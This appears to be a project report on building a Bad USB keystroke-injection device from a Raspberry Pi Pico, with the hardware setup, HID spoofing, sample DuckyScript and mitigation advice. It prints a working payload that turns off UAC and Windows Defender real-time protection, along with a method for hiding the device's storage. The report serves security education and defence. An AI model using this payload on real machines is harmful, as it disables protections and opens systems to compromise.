# Creating a Bad USB using a Raspberry Pi Pico

## Introduction
This report details the creation of a Bad USB device using a Raspberry Pi Pico. It will cover the definition of Bad USBs, their potential applications, altercation of the Pico, a demonstration of executing a malicious payload in Windows 10, and finally discuss mitigation strategies. This project aims to highlight the ease of which an individual can access and deploy potentially harmful tools and to prove a cyber security threat can come from anywhere. 

## What are Bad USBs?
Bad USBs are devices that aim to imitate standard USB peripherals (such as keyboards or storage devices) with the ability to execute malicious code. They have the ability to perform tasks that would normally require user interaction and can perform these actions with such speed that the target device could be compromised within minutes. Bad USBs usually use libraries to make themselves appear as a Human Interface Device (HID), bypassing any controls implemented on the system that attempt to block mass storage devices. Once connected, a pre-loaded payload will be executed at varying levels of discretion depending on the specific script and target.

There are many applications of Bad USBs such as OS information detection, Wi-Fi password exfiltration and keylogging. Thanks to network capabilities on some microcontrollers, Bad USBs can also be operated remotely to change payloads and exfiltrate user data. However, alongside malicious use cases these devices have genuine applications for automation in activities such as threat hunting and vulnerability patching, working at speeds much faster than humans can.

## Prepping the Pico
Ready-made Bad USB tools already exist, such as the USB Rubber Ducky by Hak5 which uses its own programming language - DuckyScript. These come with significant costs and can easily have their function replicated by a microcontroller. The Raspberry Pi Pico costs anywhere from £4-£8 depending on the model you choose and has 2Mb of onboard flash memory which can be used to store MicroPython scripts compatible with most payloads intended for the Rubber Ducky. 

To change the Pico, CircuitPython had to be installed first to run the code and host the libraries required for the final project. After this was installed to the board, I populated the Pico's lib folder with Adafruit’s HID spoofing library to circumvent any challenges against mass storage devices later. I then installed code to the Pico that would utilise this library and aid the board in translating DuckyScript code to MicroPython allowing for a payload to be added.

Hak5 maintain a GitHub repository with a large number of payloads suitable for most Bad USBs, ranging from pranks to malicious code which gave me a wide variety of scenarios to test the functionality of my newly created device.

## Example Code Execution
As an initial test, I uploaded a basic script which would type Hello World!


https://github.com/user-attachments/assets/300d63a6-e5e6-4324-8b4c-97c262e540da

```
DELAY 1000
GUI r
DELAY 1000
STRING notepad
DELAY 1000
ENTER
DELAY 1000
STRING Hello World
```

This code begins by opening the run menu and searching for the notepad app, before typing a message to the user. This code and video demonstration shows both the simplicity of Bad USB scripts but also the immense speed of execution which would be challenging to effectively deal with. The code itself is a combination of keystrokes and delays to imitate a user while creating a buffer between actions to avoid missing a step and ruining the payload’s function.

![HID](https://github.com/user-attachments/assets/d1439c56-d83d-413e-a76f-db9d82b3bd68)

**Fig.1 - Device Manager detecting Pico as HID**

Fig.1 shows the microcontroller successfully obscuring itself as a Human Interface Device, together with storage.disable_usb_drive() in code.py successfully hides the device’s ability to store malicious code from the system and its users.

## Disabling Windows Defender 
For a real-world example, I decided to use a payload designed to lower User Access Controls (UAC) on a system and then delay real-time threat detection. The attack was conducted in a sandboxed Windows 10 environment to analyse the exact actions of the code in a safe manner without interference. It's important to note that when exploring malicious technologies, you only use them against your own devices unless given expressed permission to target someone else’s machine.


https://github.com/user-attachments/assets/06e7d209-7832-4546-964a-9abbe396c23a

![UAC](https://github.com/user-attachments/assets/0b938019-bb22-4405-99c3-e9536cd2bd02)

**Fig.2 - User Access Controls post-attack**

As seen in Fig.2 the Bad USB can been seen searching for UAC before disabling them entirely for the user. It should be noted that this action requires administrative access so sensible assignment of user privileges could prevent this threat.

```
REM Disable UAC
DELAY 1000
CONTROL ESCAPE
DELAY 1000
STRING uac
DELAY 1000
ENTER
DELAY 1000
DOWNARROW
DELAY 1000
DOWNARROW
DELAY 1000
DOWNARROW
DELAY 1000
TAB
DELAY 1000
ENTER
DELAY 1000
LEFT
DELAY 1000
ENTER
DELAY 1000

REM Disable Virus & Threat Protection
CONTROL ESCAPE
DELAY 1000
STRING virus protection
DELAY 1000
ENTER
DELAY 2000
TAB
DELAY 1000
TAB
DELAY 1000
TAB
DELAY 1000
TAB
DELAY 1000
ENTER
DELAY 1000
SPACE
DELAY 1000
ALT F4
```

This code comes from a ThreatLocker display show designed for the Zero Trust World convention 2025. The code itself is again incredibly simple, using keys to navigate through menus to the desired controls and then disabling them. The link to the repository this payload originated from can be found below along with any other resources used or mentioned in this project.

## Mitigation Strategies
Preventing attacks originating from Bad USBs is difficult due to the small sizes of the devices meaning they could be hidden anywhere. The use of a Pico eliminates the option to hide in plain sight or mislead an employee into plugging it in however it’s still very capable of being obscured in the USB ports directly on the motherboard.

The best options for mitigating Bad USB attacks are being mindful of physical security. You should never plug in unknown devices as they could be loaded with malware waiting for a target. As well as this, locking devices when away helps prevent any damage caused by the payloads as they mostly require the user to already be logged in and won't be able to adjust to this restriction. Lastly, blocking unused USB ports and locking USB peripherals into place helps to cut down the number of attack vectors for this type of exploit despite the potential inconvenience caused.

## Conclusion
This Project demonstrates how easy malicious tools can be created and deployed without any prior experience in the field due to the wealth of resources online. The accessibility of hardware like the Raspberry Pi Pico also highlights the need for robust security practices and increased levels of user awareness. The ability to launch a potentially devastating attack with a device costing £4 should be a significant concern for anyone involved in securing IT devices as the methods utilised by Bad USBs will only advance in the future.

## Relevant Links
Pico-Ducky project (https://github.com/dbisu/pico-ducky)
CircuitPython (https://circuitpython.org/board/raspberry_pi_pico/)
Adafruit libraries (https://github.com/adafruit/Adafruit_CircuitPython_Bundle) 
Hak5 Payloads (https://github.com/hak5/usbrubberducky-payloads/tree/master/payloads/library) 
ZTW2025 Payloads (https://github.com/ztwAdmin/ZTW-2025)
